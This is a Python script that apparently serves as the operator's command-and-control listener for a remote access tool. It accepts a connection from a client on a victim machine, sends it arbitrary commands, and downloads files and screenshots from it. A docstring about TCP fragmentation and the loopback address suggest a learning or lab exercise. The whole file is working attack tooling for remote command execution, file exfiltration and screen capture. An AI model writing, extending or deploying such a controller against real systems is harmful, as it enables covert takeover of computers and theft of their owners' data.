import socket

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_receive_all_data(socket_p, data_len):
    # The none initialisation of data_received is to notify the caller that the data has not been received if data_len is 0
    data_received = None
    current_data_length = 0
    while current_data_length < data_len:
        chunk_len = data_len-current_data_length
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data_segment = socket_p.recv(chunk_len)
        if not data_segment:
            return None
        if not data_received:
            data_received = data_segment
        else:
            data_received += data_segment
        current_data_length += len(data_segment)
    return data_received

def send_command_and_receive_all_data(socket_p, command):
    if not command:
        return None
    socket_p.sendall(command.encode())
    header_data = socket_receive_all_data(socket_p, 13)
    data_len = int(header_data.decode())
    data_received = socket_receive_all_data(socket_p, data_len)
    return data_received


s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # restarts server instantly
s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Listening for connection on {HOST_IP}, port {HOST_PORT}.......")
connection_socket, client_address = s.accept()
print(f"Connection established with {client_address}")
s.close()

dl_filename = None
while True:
    client_machine_info = send_command_and_receive_all_data(connection_socket, "info")
    if not client_machine_info:
        break
    command = input(f"{client_machine_info.decode()} >  ")

    command_split = command.split(' ')
    if len(command_split) == 2 and command_split[0] == "dl":
        dl_filename = command_split[1]
    if len(command_split) == 2 and command_split[0] == "capture":
        dl_filename = command_split[1]+".png"

    data = send_command_and_receive_all_data(connection_socket, command)
    if not data:
        break

    if dl_filename:
        if len(data) == 1 and data == b" ":
            print(f"The file '{command_split[1]}' does not exist")
        else:
            f = open(dl_filename, "wb")
            f.write(data)
            f.close()
            print("File",dl_filename,"download")
        dl_filename = None
    else:
        print(data.decode())

connection_socket.close()

"""
The reason for the socket_receive_all_data() function: 
In TCP networking, data can be fragmented. When you ask for 13 bytes, the network might only give you 5 bytes
in the first "packet" and the other 8 bytes a millisecond later. So if you call the recv() function once you may collect
incomplet data
"""